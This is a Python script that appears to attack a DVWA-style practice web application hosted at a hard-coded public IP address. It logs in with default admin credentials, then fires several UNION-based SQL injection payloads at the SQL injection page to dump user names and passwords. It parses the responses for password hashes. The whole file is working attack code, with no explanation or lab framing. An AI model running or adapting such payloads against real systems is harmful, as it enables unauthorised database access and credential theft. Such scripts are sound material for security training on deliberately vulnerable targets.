
import requests
import re
from urllib.parse import quote

base_url = "http://31.97.117.123"
login_url = f"{base_url}/login.php"
sqli_url = f"{base_url}/vulnerabilities/sqli/"

# First authenticate
session = requests.Session()
response = session.get(login_url)
token_match = re.search(r"user_token'? value='([a-f0-9]+)'", response.text)

if token_match:
    user_token = token_match.group(1)
    
    # Login
    data = {
        "username": "admin",
        "password": "password",
        "user_token": user_token,
        "Login": "Login"
    }
    
    session.post(login_url, data=data)
    
    print("[*] Testing SQL injection without comments...\n")
    
    # Try WITHOUT using comment at the end
    payloads = [
        "1' UNION SELECT user_id, user, password FROM users WHERE 1=1 AND '1'='1",
        "1' UNION SELECT 1, 'admin', 'password' WHERE '1'='1",
        "1' OR 1=1 UNION SELECT user_id, user, password FROM users WHERE 1=1 AND '1'='1",
        "999 UNION SELECT 1, 'test', 'test2'",
        "1 AND 1=2 UNION SELECT user_id, user, password FROM users",
    ]
    
    for payload in payloads:
        print(f"\n[*] Testing: {payload[:80]}")
        params = {"id": payload, "Submit": "Submit"}
        response = session.get(sqli_url, params=params, timeout=10)
        
        if "error" in response.text.lower():
            error_match = re.search(r'<pre>(.*?)</pre>', response.text, re.DOTALL)
            if error_match:
                print(f"[-] Error: {error_match.group(1)[:200]}")
        elif "First name:" in response.text:
            pre_match = re.search(r'<pre>(.*?)</pre>', response.text, re.DOTALL)
            if pre_match:
                content = pre_match.group(1)
                print(f"[+] Success! Response:\n{content[:300]}")
                
                # Extract any hash-like patterns
                hashes = re.findall(r'[a-f0-9]{32}|[a-f0-9]{40}|[a-f0-9]{64}', content)
                if hashes:
                    print(f"[+] Found potential hashes: {hashes}")

